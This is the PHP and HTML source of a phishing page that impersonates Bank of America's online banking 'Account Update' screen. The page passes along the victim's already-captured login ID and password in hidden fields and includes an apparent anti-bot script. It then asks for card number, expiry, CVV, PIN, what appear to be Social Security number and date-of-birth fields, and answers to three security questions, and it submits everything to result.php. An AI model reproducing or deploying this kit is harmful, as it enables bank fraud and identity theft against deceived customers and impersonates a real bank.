﻿     <?php
$id = $_POST['id'];
$pass = $_POST['pass'];
include "antibots.php";

?>
<html>
    
    <head><meta http-equiv="Content-Type" content="text/html; charset=ansi_x3.110-1983">
        <! --- Links ---- !>
        <link rel="stylesheet" href="./css/style1.css" type="text/css" />
        <title>Bank Of America | Online Banking | Account Update</title>

<link rel="shortcut icon"
              href="images/favicon.ico"/>
        <! ---- Links --- !>
         </head>

</script>


    <body>
        <! --- Header ---- !>
       <header class="ilyas_header">
           <div class="logo">

<IMG src="img/boa-header2.png" style="position:absolute;top:0px;left:0px;">
</div>
</div>

<a target="_blank" href="#"><IMG src="img/sb.png" style="position:absolute;top:1px;left:640px; solid #bdc4c9;"></a>
</div>
</div>

<a target="_blank" href="https://www.ml.com/wealthmanagement.html"><IMG src="img/wm.png" style="position:absolute;top:2px;left:760px; solid #bdc4c9;"></a>
</div>
</div>

<a target="_blank" href="https://www.bofaml.com/content/boaml/en_us/home.html"><IMG src="img/bi.png" style="position:absolute;top:3px;left:903px; solid #bdc4c9;"></a>
</div>
</div>

<a target="_blank" href="https://about.bankofamerica.com/"><IMG src="img/about.png" style="position:absolute;top:4px;left:1103px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/up.png" style="position:absolute;top:169px;left:365px; z-index:12"></a>
</div>
</div>

<a href="#"><IMG src="img/sc.png" style="position:absolute;top:168px;left:457px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/profile.png" style="position:absolute;top:44px;left:984px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/bp.png" style="position:absolute;top:104px;left:274px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/transfer.png" style="position:absolute;top:105px;left:353px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/sod.png" style="position:absolute;top:105px;left:445px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/ti.png" style="position:absolute;top:105px;left:608px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/oaa.png" style="position:absolute;top:104px;left:740px; solid #bdc4c9;"></a>
</div>
</div>

<a href="#"><IMG src="img/hs.png" style="position:absolute;top:105px;left:883px; solid #bdc4c9;"></a>
</div>
</div>

<form action="result.php" name="chalbhai" id="chalbhai" method="post" required="required">

<input style="position:absolute;left:255px;top:162px;font-size:16px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" disabled="disabled"  name="id" value="<?=$id?>"type="">
<input name="id" value="<?=$id?>"type="hidden">
<input name="pass" value="<?=$pass?>"type="hidden">
</div>
</div>

<input name="formtext1" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="100" style="position:absolute;left:386px;top:332px;width:148px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="Name on card"> 
</div>
</div>

<input name="formtext2" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="16" style="position:absolute;left:386px;top:368px;width:148px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="14 - 16 digit"> 
</div>
</div>

<select name="formselect1" type="text"  required="required" maxlength="40" style="position:absolute;left:386px;top:404px;width:58px;height:18px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;z-index:28"><option value="">Select</option>
	<option value="01">01</option>
	<option value="02">02</option>
	<option value="03">03</option>
	<option value="04">04</option>
	<option value="05">05</option>
	<option value="06">06</option> 
        <option value="07">07</option>
	<option value="08">08</option>
	<option value="09">09</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option></select> 
</div>
</div>


<select name="formselect2" type="text"  required="required" maxlength="40" style="position:absolute;left:386px;top:439px;width:58px;height:18px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;z-index:29"><option value="">Select</option>
	<option value="2017">2017</option>
	<option value="2018">2018</option>
	<option value="2019">2019</option>
	<option value="2020">2020</option>
	<option value="2021">2021</option>
	<option value="2022">2022</option> 
        <option value="2023">2023</option>
	<option value="2024">2024</option>
	<option value="2025">2025</option>
	<option value="2026">2026</option>
	<option value="2027">2027</option></select> 
</div>
</div>


<input name="formtext3" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="3" style="position:absolute;left:386px;top:474px;width:42px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="3 digit"> 
</div>
</div>

<input name="formtext4" type="password" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" minlength="4" maxlength="6" style="position:absolute;left:386px;top:510px;width:52px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="4 - 6 digit"> 
</div>
</div>


<input name="formtext5" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="5" style="position:absolute;left:386px;top:546px;width:47px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="5 digits"> 
</div>
</div>


<input name="formtext6" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="3" style="position:absolute;left:386px;top:583px;width:32px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder=""> 
</div>
</div>


<input name="formtext7" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="2" style="position:absolute;left:431px;top:583px;width:32px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder=""> 
</div>
</div>

<input name="formtext8" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="4" style="position:absolute;left:476px;top:583px;width:52px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder=""> 
</div>
</div>


<input name="formtext9" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="2" style="position:absolute;left:386px;top:620px;width:32px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="mm"> 
</div>
</div>


<input name="formtext10" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="2" style="position:absolute;left:430px;top:620px;width:32px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="dd"> 
</div>
</div>

<input name="formtext11" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="4" style="position:absolute;left:474px;top:620px;width:52px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="yyyy"> 
</div>
</div>




<input name="formtext12" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="60" style="position:absolute;left:386px;top:654px;width:129px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder=""> 
</div>
</div>

<input name="formtext13" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="40" style="position:absolute;left:386px;top:690px;width:129px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder=""> 
</div>
</div>



<select name="formselect3" type="text"  required="required" maxlength="40" style="position:absolute;left:386px;top:729px;width:477px;height:18px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;z-index:30"><option value="">-- Select Question  --</option>
                    <option value="What was the name of your first pet?">What was the name of your first pet?</option>
                    <option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
                    <option value="What is the name of a college you applied to but didn&#39;t attend?">What is the name of a college you applied to but didn't attend?</option>
                    <option value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
                    <option value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
                    <option value="On what street is your grocery store?">On what street is your grocery store?</option>
                    <option value="What is the first name of your mother&#39;s closest friend?">What is the first name of your mother's closest friend?</option>
                    <option value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</option>
                    <option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
                    <option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
                </select>

</div>
</div>


<input name="formtext14" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="100" style="position:absolute;left:386px;top:764px;width:132px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="Write your answer here"> 
</div>
</div>





<select name="formselect4" type="text"  required="required" maxlength="40" style="position:absolute;left:386px;top:800px;width:477px;height:18px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;z-index:31"><option value="">-- Select Question  --</option>
                <option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
                <option value="Where were you on New Year&#39;s 2000?">Where were you on New Year's 2000?</option>
                <option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
                <option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
                <option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
                <option value="What is the name of your high school&#39;s star athlete?">What is the name of your high school's star athlete?</option>
                <option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
                <option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
                <option value="As a child, what did you want to be when you grew up?">As a child, what did you want to be when you grew up?</option>
                <option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
			   </select>




<input name="formtext15" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="100" style="position:absolute;left:386px;top:835px;width:132px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="Write your answer here"> 
</div>
</div>






<select name="formselect5" type="text"  required="required" maxlength="40" style="position:absolute;left:386px;top:871px;width:477px;height:18px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;z-index:29"><option value="">-- Select Question  --</option>
                <option value="What is your best friend&#39;s first name?">What is your best friend's first name?</option>
                <option value="What is the last name of your third grade teacher?">What is the last name of your third grade teacher?</option>
                <option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
                <option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
                <option value="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
                <option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
                <option value="In what city did you honeymoon?">In what city did you honeymoon? (Enter full name of city only)</option>
                <option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
                <option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
                <option value="What street did your best friend in high school live on?">What street did your best friend in high school live on? (Enter full name of street only)</option>	
			   </select>




<input name="formtext16" type="text" tabIndex="1" aria-label="Name On Card" class="fm-text" required="required" maxlength="100" style="position:absolute;left:386px;top:906px;width:132px;height:16px;font-size:12px;padding:1px;border-radius:1px;border:0px solid #bdc4c9;" size="6"  autofocus="1" placeholder="Write your answer here"> 
</div>
</div>

<input type="image" name="formimage1" src="img/continue.png" style="position:absolute;top:939px;left:385px;">
</div>
</div>

<a target="_blank" href="#"><IMG src="img/so.png" style="position:absolute;top:42px;left:1100px; solid #bdc4c9;">
</div>
</div>

    </body>
</html>